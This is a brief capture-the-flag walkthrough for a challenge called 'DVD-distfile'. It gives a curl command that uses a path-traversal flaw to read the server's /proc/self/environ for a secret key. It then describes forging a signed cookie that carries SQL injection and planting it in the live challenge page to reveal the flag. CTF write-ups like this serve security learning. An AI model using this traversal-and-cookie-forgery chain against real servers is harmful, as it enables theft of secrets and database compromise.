# DVD-distfile exploit step by step
## 1. Use the serveMux vulnerbalitiy to get secret
Enter command to store the remote environ variables to local:

```curl -v -X CONNECT --path-as-is http://dvd.chal.h4ck3r.quest:10001/static/../../../proc/self/environ >> output.txt```

Check the secret key value:

```cat output.txt```

## 2. Visit exploit API to generate custom signed cookie
Move to the distfile repo and start the app.

```docker-compose up --build```

Then, go to `http://localhost:10001/exploit` to generate custom signed cookie that have **sql injection**.
Open dev tools and copy the generated cookie.

## 3. Paste the custom cookie to real page
Go to `http://dvd.chal.h4ck3r.quest:10001/` and open dev tools, paste the cookie generated from last step and restart the page.

Finally, this will show the FLAG.